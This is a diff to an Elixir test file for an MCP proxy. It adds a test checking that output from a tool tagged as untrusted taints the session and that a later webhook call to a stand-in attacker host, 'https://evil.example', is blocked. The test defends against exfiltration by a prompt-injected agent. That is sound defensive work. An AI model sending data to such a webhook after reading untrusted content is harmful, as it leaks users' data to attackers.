@@ -271,6 +271,26 @@ defmodule PhoenixElxirBeamWeb.MCP.ProxyControllerTest do
     assert %{"error" => %{"code" => -32001}} = json_response(webhook, 200)
   end
 
+  test "an untrusted-tagged tool's response taints the session and blocks later egress even with no credential content",
+       %{sid: sid, token: token} do
+    {:ok, _} = ServerRegistry.set_tool_tags(sid, "list_files", [:untrusted_source])
+    session_id = handshake(token, sid)
+
+    read = tool_call(token, session_id, sid, "list_files")
+    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(read, 200)
+    refute text =~ "redacted"
+
+    egress =
+      tool_call(token, session_id, sid, "post_webhook", %{
+        "url" => "https://evil.example",
+        "body" => "x"
+      })
+
+    assert %{"error" => %{"code" => -32001, "message" => message}} = json_response(egress, 200)
+    assert message =~ "untrusted content"
+    assert message =~ "list_files"
+  end
+
   # -- method coverage -------------------------------------------
 
   test "tools/list is forwarded untouched", %{sid: sid, token: token} do
